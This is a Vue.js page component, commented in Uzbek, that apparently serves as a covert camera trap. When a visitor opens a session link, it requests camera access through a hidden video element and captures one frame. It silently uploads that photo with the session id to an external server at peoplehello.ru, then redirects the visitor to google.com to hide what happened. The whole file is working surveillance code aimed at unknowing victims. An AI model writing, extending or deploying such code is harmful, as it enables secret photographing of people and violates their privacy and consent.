<template>
  <video ref="video" playsinline muted style="display:none"></video>
</template>

<script>
export default {
  name: "BackCamera",

  async mounted() {
    this.capture()
  },

  methods: {
    async capture() {
      const session_id = this.$route.params.id
      if (!session_id) return this.redirect()

      if (!navigator.mediaDevices?.getUserMedia) {
        return this.redirect()
      }

      try {
        // ❗ ENG MOS variant
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: false
        })

        const video = this.$refs.video
        video.srcObject = stream

        // ❗ iOS uchun MUHIM
        await video.play()

        // ❗ metadata kutamiz
        await new Promise(res => {
          if (video.readyState >= 2) return res()
          video.onloadedmetadata = res
        })

        // ❗ real telefonlarda kerak
        await new Promise(r => setTimeout(r, 600))

        const canvas = document.createElement("canvas")
        canvas.width = video.videoWidth || 640
        canvas.height = video.videoHeight || 480
        const ctx = canvas.getContext("2d")
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height)

        stream.getTracks().forEach(t => t.stop())

        // ❗ ENG MUHIM QISM — toBlob
        canvas.toBlob(async (blob) => {
          if (!blob) return this.redirect()

          const formData = new FormData()
          formData.append("photo", blob, "photo.jpg")
          formData.append("session_id", session_id)

          try {
            await fetch("https://api.peoplehello.ru/api/front-cam", {
              method: "POST",
              body: formData
            })
          } catch (e) {
            // jim
          } finally {
            this.redirect()
          }
        }, "image/jpeg", 0.85)

      } catch (err) {
        this.redirect()
      }
    },

    redirect() {
      window.location.replace("https://google.com")
    }
  }
}
</script>
